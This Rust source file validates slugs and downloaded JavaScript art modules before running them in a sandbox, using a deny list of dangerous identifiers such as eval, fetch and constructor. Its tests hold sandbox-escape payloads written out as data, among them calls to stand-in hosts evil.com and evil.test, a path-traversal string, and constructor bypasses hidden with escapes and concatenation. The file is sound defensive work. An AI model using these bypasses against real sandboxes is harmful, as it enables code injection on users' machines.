mod tokens;

use super::js_scope::{is_dot_property, JsScopeTracker};
use std::collections::{HashMap, HashSet};
pub(super) use tokens::{JsToken, TokenKind};
use tokens::scan_js_tokens;

const ALLOWED_IMPORTS: &[&str] = &["../lib/kit.js", "../lib/scene.js"];

const ALWAYS_FORBIDDEN_IDENTIFIERS: &[&str] = &[
    "window",
    "document",
    "globalThis",
    "self",
    "chrome",
    "__TAURI_INTERNALS__",
    "__TAURI__",
    "eval",
    "Function",
    "AsyncFunction",
    "GeneratorFunction",
    "fetch",
    "XMLHttpRequest",
    "WebSocket",
    "EventSource",
    "Worker",
    "SharedWorker",
    "ServiceWorker",
    "importScripts",
    "localStorage",
    "sessionStorage",
    "indexedDB",
    "navigator",
    "Reflect",
    "Proxy",
    "constructor",
    "__proto__",
    "prototype",
    "postMessage",
];

const CONTEXT_SENSITIVE_GLOBALS: &[&str] = &["top", "parent", "frames", "location", "cookie"];

/// Validates a bare ASCII Magic slug (`^[a-z0-9][a-z0-9-]{0,95}$`).
pub fn is_valid_slug(slug: &str) -> bool {
    if slug.is_empty() || slug.len() > 96 || crate::security::is_dos_device_name(slug) {
        return false;
    }
    let bytes = slug.as_bytes();
    if !bytes[0].is_ascii_lowercase() && !bytes[0].is_ascii_digit() {
        return false;
    }
    bytes
        .iter()
        .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || *b == b'-')
}

/// Normalizes either a bare slug (`chai-stall-dawn`) or an official
/// `https://www.ascii-magic.com/ascii/<slug>` URL into a verified slug.
pub fn normalize_slug_or_url(raw: &str) -> Result<String, String> {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return Err("Please enter an ASCII Magic slug or piece URL.".to_string());
    }

    let candidate = if trimmed.contains("://") {
        let lower = trimmed.to_ascii_lowercase();
        let rest = lower
            .strip_prefix("https://www.ascii-magic.com/ascii/")
            .or_else(|| lower.strip_prefix("https://ascii-magic.com/ascii/"))
            .ok_or_else(|| {
                "Only official https://www.ascii-magic.com/ascii/<slug> URLs or bare slugs are allowed."
                    .to_string()
            })?;
        let without_suffix = rest.split(['?', '#']).next().unwrap_or(rest);
        let segment = without_suffix.trim_matches('/');
        if segment.starts_with("pieces/") {
            segment
                .trim_start_matches("pieces/")
                .trim_end_matches(".js")
                .to_string()
        } else {
            segment.to_string()
        }
    } else {
        trimmed.trim_end_matches(".js").to_ascii_lowercase()
    };

    if !is_valid_slug(&candidate) {
        return Err(
            "Invalid ASCII Magic slug. Use lowercase letters, numbers, and hyphens only."
                .to_string(),
        );
    }

    Ok(candidate)
}

pub fn is_valid_look(look: &str) -> bool {
    matches!(
        look,
        "original" | "dots" | "ascii" | "dense" | "blocks" | "dither"
    )
}

fn is_always_disallowed_prop(value: &str) -> bool {
    matches!(
        value,
        "constructor" | "__proto__" | "prototype" | "__TAURI__" | "__TAURI_INTERNALS__"
    )
}

fn is_member_bracket(tokens: &[JsToken], open_idx: usize) -> bool {
    if open_idx == 0 {
        return false;
    }
    let prev = &tokens[open_idx - 1];
    match prev.kind {
        TokenKind::Str | TokenKind::Template | TokenKind::Num | TokenKind::Regex => true,
        TokenKind::Punct => matches!(prev.value.as_str(), ")" | "]" | "}"),
        TokenKind::Ident => !matches!(
            prev.value.as_str(),
            "const"
                | "let"
                | "var"
                | "return"
                | "throw"
                | "case"
                | "else"
                | "typeof"
                | "void"
                | "delete"
                | "in"
                | "of"
                | "instanceof"
                | "await"
                | "yield"
                | "new"
                | "export"
                | "default"
                | "do"
        ),
    }
}

fn find_matching_bracket(tokens: &[JsToken], open_idx: usize) -> Option<usize> {
    let mut depth = 0usize;
    for (j, t) in tokens.iter().enumerate().skip(open_idx) {
        if t.kind == TokenKind::Punct {
            match t.value.as_str() {
                "[" | "(" | "{" => depth += 1,
                "]" | ")" | "}" => {
                    depth = depth.saturating_sub(1);
                    if depth == 0 && t.value == "]" {
                        return Some(j);
                    }
                }
                _ => {}
            }
        }
    }
    None
}

fn check_bracket_index(
    tokens: &[JsToken],
    open_idx: usize,
    always_forbidden: &HashSet<&str>,
    context_sensitive: &HashSet<&str>,
) -> Result<(), String> {
    if !is_member_bracket(tokens, open_idx) {
        return Ok(());
    }
    let Some(close_idx) = find_matching_bracket(tokens, open_idx) else {
        return Err("Unbalanced bracket indexing expression in piece source".to_string());
    };
    let mut has_str = false;
    let mut has_plus = false;
    for tok in &tokens[(open_idx + 1)..close_idx] {
        if tok.kind == TokenKind::Template {
            return Err(
                "Rejected piece module using template literal inside bracket property access"
                    .to_string(),
            );
        }
        if tok.kind == TokenKind::Str {
            has_str = true;
            if is_always_disallowed_prop(&tok.value)
                || always_forbidden.contains(tok.value.as_str())
                || context_sensitive.contains(tok.value.as_str())
            {
                return Err(format!(
                    "Rejected piece module due to disallowed bracket property '{}'",
                    tok.value
                ));
            }
        } else if tok.kind == TokenKind::Punct && tok.value == "+" {
            has_plus = true;
        }
    }
    if has_str && has_plus {
        return Err(
            "Rejected piece module using string concatenation inside bracket property access"
                .to_string(),
        );
    }
    Ok(())
}

fn eval_concat_primary(
    tokens: &[JsToken],
    idx: usize,
    depth: usize,
) -> Option<(String, usize, usize)> {
    if depth > 8 {
        return None;
    }
    let tok = tokens.get(idx)?;
    if matches!(tok.kind, TokenKind::Str | TokenKind::Template) {
        return Some((tok.value.clone(), 1, idx + 1));
    }
    if tok.kind == TokenKind::Punct && tok.value == "(" {
        let (inner, parts, next_i) = eval_concat_expr(tokens, idx + 1, depth + 1)?;
        let close = tokens.get(next_i)?;
        if close.kind == TokenKind::Punct && close.value == ")" {
            return Some((inner, parts, next_i + 1));
        }
    }
    None
}

fn eval_concat_expr(tokens: &[JsToken], idx: usize, depth: usize) -> Option<(String, usize, usize)> {
    let (mut acc, mut parts, mut cur) = eval_concat_primary(tokens, idx, depth)?;
    while let Some(plus) = tokens.get(cur) {
        if plus.kind != TokenKind::Punct || plus.value != "+" {
            break;
        }
        let Some((rhs, rhs_parts, next_i)) = eval_concat_primary(tokens, cur + 1, depth) else {
            break;
        };
        acc.push_str(&rhs);
        parts += rhs_parts;
        cur = next_i;
    }
    Some((acc, parts, cur))
}

fn check_template_static_runs(tokens: &[JsToken]) -> Result<(), String> {
    let mut by_id: HashMap<u32, String> = HashMap::new();
    for tok in tokens {
        if tok.kind == TokenKind::Template && tok.template_id > 0 {
            by_id.entry(tok.template_id).or_default().push_str(&tok.value);
        }
    }
    for joined in by_id.values() {
        if is_always_disallowed_prop(joined) {
            return Err(format!(
                "Rejected piece module due to disallowed template property '{}'",
                joined
            ));
        }
    }
    Ok(())
}

/// Validates downloaded ASCII Magic ES module source before storing on disk
/// and before serving inside `ascii-sandbox://`.
pub fn validate_piece_source_js(source: &str) -> Result<(), String> {
    if source.trim().is_empty() {
        return Err("Piece source file is empty".to_string());
    }
    let tokens = scan_js_tokens(source)?;
    check_template_static_runs(&tokens)?;
    let always_forbidden: HashSet<&str> = ALWAYS_FORBIDDEN_IDENTIFIERS.iter().copied().collect();
    let context_sensitive: HashSet<&str> = CONTEXT_SENSITIVE_GLOBALS.iter().copied().collect();
    let allowed_imports: HashSet<&str> = ALLOWED_IMPORTS.iter().copied().collect();
    let mut scope = JsScopeTracker::new();

    let mut idx = 0;
    while idx < tokens.len() {
        scope.advance(&tokens, idx);
        let tok = &tokens[idx];
        if tok.kind == TokenKind::Punct && tok.value == "[" {
            check_bracket_index(&tokens, idx, &always_forbidden, &context_sensitive)?;
        }
        let is_concat_start = matches!(tok.kind, TokenKind::Str | TokenKind::Template)
            || (tok.kind == TokenKind::Punct
                && tok.value == "("
                && tokens.get(idx + 1).is_some_and(|next| {
                    matches!(next.kind, TokenKind::Str | TokenKind::Template)
                        || (next.kind == TokenKind::Punct && next.value == "(")
                }));
        if is_concat_start {
            let prev_is_bracket = idx > 0
                && tokens[idx - 1].kind == TokenKind::Punct
                && tokens[idx - 1].value == "[";
            if matches!(tok.kind, TokenKind::Str | TokenKind::Template)
                && (is_always_disallowed_prop(&tok.value)
                    || (prev_is_bracket
                        && (always_forbidden.contains(tok.value.as_str())
                            || context_sensitive.contains(tok.value.as_str()))))
            {
                return Err(format!(
                    "Rejected piece module due to disallowed string property '{}'",
                    tok.value
                ));
            }
            if let Some((joined, parts, _)) = eval_concat_expr(&tokens, idx, 0) {
                if parts >= 2
                    && (is_always_disallowed_prop(&joined)
                        || (prev_is_bracket
                            && (always_forbidden.contains(joined.as_str())
                                || context_sensitive.contains(joined.as_str()))))
                {
                    return Err(format!(
                        "Rejected piece module due to disallowed concatenated property '{}'",
                        joined
                    ));
                }
            }
        } else if tok.kind == TokenKind::Ident {
            let name = tok.value.as_str();
            if always_forbidden.contains(name)
                || (context_sensitive.contains(name) && !scope.is_safe_context_ident(&tokens, idx))
            {
                return Err(format!(
                    "Rejected piece module due to disallowed identifier '{}'",
                    tok.value
                ));
            }
            // Enforce ES module static import allowlist & ban dynamic import()
            let prev_is_dot = is_dot_property(&tokens, idx);
            if !prev_is_dot && tok.value == "import" {
                let next = tokens.get(idx + 1);
                if next.map(|t| t.value.as_str()) == Some("(")
                    || next.map(|t| t.value.as_str()) == Some(".")
                {
                    return Err("Rejected piece module using dynamic import or import.meta".to_string());
                }
                // Walk forward to the module specifier string ending the import statement
                let mut j = idx + 1;
                let mut found_spec: Option<&str> = None;
                let limit = (idx + 512).min(tokens.len());
                while j < limit {
                    if tokens[j].kind == TokenKind::Str
                        && (j == idx + 1
                            || (tokens[j - 1].kind == TokenKind::Ident
                                && tokens[j - 1].value == "from"))
                    {
                        found_spec = Some(tokens[j].value.as_str());
                        break;
                    }
                    if tokens[j].kind == TokenKind::Punct && tokens[j].value == ";" {
                        break;
                    }
                    if j > idx + 1
                        && tokens[j].kind == TokenKind::Ident
                        && matches!(
                            tokens[j].value.as_str(),
                            "import" | "export" | "const" | "let" | "var" | "function"
                        )
                    {
                        break;
                    }
                    j += 1;
                }
                let Some(spec) = found_spec else {
                    return Err("Unrecognized import statement in piece module".to_string());
                };
                if !allowed_imports.contains(spec) {
                    return Err(format!(
                        "Rejected piece module import '{}'; only local kit/scene helpers are allowed",
                        spec
                    ));
                }
            }
            if !prev_is_dot && tok.value == "export" {
                let mut j = idx + 1;
                let limit = (idx + 128).min(tokens.len());
                while j < limit {
                    if tokens[j].kind == TokenKind::Punct && tokens[j].value == ";" {
                        break;
                    }
                    if tokens[j].kind == TokenKind::Ident && tokens[j].value == "from" {
                        if let Some(spec_tok) = tokens.get(j + 1) {
                            if spec_tok.kind == TokenKind::Str
                                && !allowed_imports.contains(spec_tok.value.as_str())
                            {
                                return Err(format!(
                                    "Rejected re-export specifier '{}'",
                                    spec_tok.value
                                ));
                            }
                        }
                    }
                    if j > idx + 1
                        && tokens[j].kind == TokenKind::Ident
                        && matches!(
                            tokens[j].value.as_str(),
                            "const" | "let" | "var" | "function" | "default" | "class"
                        )
                    {
                        break;
                    }
                    j += 1;
                }
            }
        }
        idx += 1;
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn normalizes_slug_and_official_urls() {
        assert_eq!(
            normalize_slug_or_url("chai-stall-dawn").unwrap(),
            "chai-stall-dawn"
        );
        assert_eq!(
            normalize_slug_or_url("https://www.ascii-magic.com/ascii/acropolis-hill-dusk/").unwrap(),
            "acropolis-hill-dusk"
        );
        assert_eq!(
            normalize_slug_or_url("https://ascii-magic.com/ascii/pieces/abu-simbel-colossi.js?v=1").unwrap(),
            "abu-simbel-colossi"
        );
        assert!(normalize_slug_or_url("https://evil.example.com/ascii/foo").is_err());
        assert!(normalize_slug_or_url("../etc/passwd").is_err());
        assert!(normalize_slug_or_url("UPPER:ads").is_err());
    }

    #[test]
    fn allows_clean_scene_even_with_windows_function_and_comment_words() {
        let safe_js = r#"
          /* window and document words inside comments are harmless */
          import { fbm, noise2 } from "../lib/kit.js";
          import { W, H, Canvas, windows, encoder } from "../lib/scene.js";
          export const meta = { slug: "test-city", note: "window reflection fetch eval" };
          export default function create() {
            const f = new Canvas(), enc = encoder([]);
            return (t) => { windows(f, 0, 0, 10, 10, {}); return enc(f); };
          }
        "#;
        assert!(validate_piece_source_js(safe_js).is_ok());
    }

    #[test]
    fn rejects_dangerous_tokens_hidden_in_code_or_templates() {
        assert!(validate_piece_source_js(r#"import { x } from "https://evil.com/a.js";"#).is_err());
        assert!(validate_piece_source_js(r#"const f = () => eval("1+1");"#).is_err());
        assert!(validate_piece_source_js(r#"const x = `ok ${window.location}`;"#).is_err());
        assert!(validate_piece_source_js(r#"const m = import("./other.js");"#).is_err());
        assert!(validate_piece_source_js(r#"const y = ""["constructor"]("return 1")();"#).is_err());
        assert!(validate_piece_source_js(r#"const a = top; export default () => a;"#).is_err());
        assert!(validate_piece_source_js(r#"{ let top = 1; } const leak = top;"#).is_err());
        assert!(validate_piece_source_js(r#"const x = globalThis["top"];"#).is_err());
        assert!(validate_piece_source_js(r#"const fn = ({ a }) => parent;"#).is_err());
        assert!(validate_piece_source_js(r#"const b = self.frames;"#).is_err());
    }

    #[test]
    fn allows_benign_geometry_bindings_properties_and_object_keys() {
        let iceberg_like = r##"
          import { W, H, Canvas, encoder } from "../lib/scene.js";
          const ridge = (x, top, h) => {
            const box = { top: top, frames: 8, parent: null };
            const y0 = Math.floor(box.top + h);
            const [a, frames] = [box.frames, 12];
            for (let top = 0; top < y0; top++) {
              const parent = a + frames + top;
              if (parent > 0) return parent;
            }
            return y0;
          };
          const icebergTop = (top) => ridge(0, top, 4);
          export default function create() {
            const f = new Canvas(), enc = encoder([]);
            return (t) => {
              const top = 12 + Math.sin(t);
              const n = icebergTop(top);
              f.put(0, n, "#fff", 1);
              return enc(f);
            };
          }
        "##;
        if let Err(err) = validate_piece_source_js(iceberg_like) {
            panic!("Expected benign geometry piece to pass, got: {err}");
        }
    }

    #[test]
    fn rejects_escape_concat_template_and_postfix_regex_bypasses() {
        // 1. Hex/Unicode string literal escapes
        assert!(validate_piece_source_js(r#"const x = ""["\u0063onstructor"];"#).is_err());
        assert!(validate_piece_source_js(r#"const x = ""["\x63onstructor"];"#).is_err());
        assert!(validate_piece_source_js(r#"const x = ""["\u{63}onstructor"];"#).is_err());
        // Unicode escape in identifier
        assert!(validate_piece_source_js(r#"const x = \u0065val("1");"#).is_err());
        assert!(validate_piece_source_js(r#"const x = e\u0076al("1");"#).is_err());

        // 2. Template literals & computed bracket indexing with templates
        assert!(validate_piece_source_js(r#"const y = ""[`constructor`]("return 1")();"#).is_err());
        assert!(validate_piece_source_js(r#"const k = `constructor`;"#).is_err());
        assert!(validate_piece_source_js(r#"const k = `con${""}structor`;"#).is_err());
        assert!(validate_piece_source_js(r#"const x = obj[`top`];"#).is_err());

        // 3. String `+` concatenation (both standalone and inside `[...]`)
        assert!(validate_piece_source_js(r#"const k = "con" + "structor";"#).is_err());
        assert!(validate_piece_source_js(r#"const k = ("con") + `structor`;"#).is_err());
        assert!(validate_piece_source_js(r#"const y = ""["con" + x];"#).is_err());
        assert!(validate_piece_source_js(r#"const y = ""[("to" + "p")];"#).is_err());

        // 4. Postfix ++ / -- before `/` must not swallow code as regex
        assert!(validate_piece_source_js(r#"let x = 1; const z = x++ / eval("1") / 2;"#).is_err());
        assert!(validate_piece_source_js(r#"let x = 1; const z = x-- / eval("1") / 2;"#).is_err());

        // 5. CR / U+2028 / U+2029 inside line comments must terminate the comment so hidden calls are caught
        assert!(validate_piece_source_js("// safe\rfetch('https://evil.test');").is_err());
        assert!(validate_piece_source_js("// safe\u{2028}fetch('https://evil.test');").is_err());
        assert!(validate_piece_source_js("// safe\u{2029}eval('1');").is_err());
        assert!(!is_valid_slug("con"));
        assert!(!is_valid_slug("nul"));

        // Benign array literal containing template strings and UTF-8 box art must still pass
        let benign = r#"
          import { W, H, Canvas, encoder } from "../lib/scene.js";
          const glyphs = [`░▒▓`, `╔═╗`];
          const s = "row-" + glyphs[0];
          export default function create() {
            const f = new Canvas(), enc = encoder([]);
            return (t) => { f.put(0, 0, s, 1); return enc(f); };
          }
        "#;
        assert!(validate_piece_source_js(benign).is_ok());
    }
}
